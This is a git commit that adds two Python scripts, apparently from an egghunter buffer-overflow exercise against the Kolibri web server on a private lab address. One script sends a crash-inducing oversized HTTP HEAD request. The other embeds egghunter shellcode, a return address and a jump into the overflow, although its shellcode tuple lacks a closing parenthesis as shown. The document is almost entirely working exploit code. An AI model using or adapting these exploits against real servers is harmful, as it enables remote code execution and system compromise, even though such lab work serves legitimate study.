4f42b1dd7e8565dec58c7b4e4a61a14c54106d4f
jacobforer <jacobforer@JACFOR-COTP-1.fios-router.home>
2016-10-19 17:27:39 -0400

    egg hunter
    egg hunter

---
+++ Egghunter-BoF/Kolibri/1st time/kol1.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+Stagel = "A" * 600
+
+buffer = (
+"HEAD /" + Stagel + " HTTP/1.1\r\n"
+"Host: 192.168.201.140:8080\r\n"
+"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
+"Keep-Alive: 115\r\n"
+"Connection: keep-alive\r\n\r\n")
+
+exp1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+exp1.connect(("192.168.201.140", 8080))
+exp1.send(buffer)
+exp1.close()
---
+++ Egghunter-BoF/Kolibri/1st time/kol5.py
@@ -0,0 +1,29 @@
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+hunter = (
+"\x66\x81\xca\xff"
+"\x0f\x42\x52\x6a"
+"\x02\x58\xcd\x2e"
+"\x3c\x05\x5a\x74"
+"\xef\xb8\x62\x33" #b3
+"\x33\x66\x8b\xfa" #3f
+"\xaf\x75\xea\xaf"
+"\x75\xe7\xff\xe7"
+
+Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
+
+buffer = (
+"HEAD /" + Stage1 + " HTTP/1.1\r\n"
+"Host: 192.168.201.140:8080\r\n"
+"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
+"Keep-Alive: 115\r\n"
+"Connection: keep-alive\r\n\r\n")
+
+exp1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+exp1.connect(("192.168.201.140", 8080))
+exp1.send(buffer)
+exp1.close()
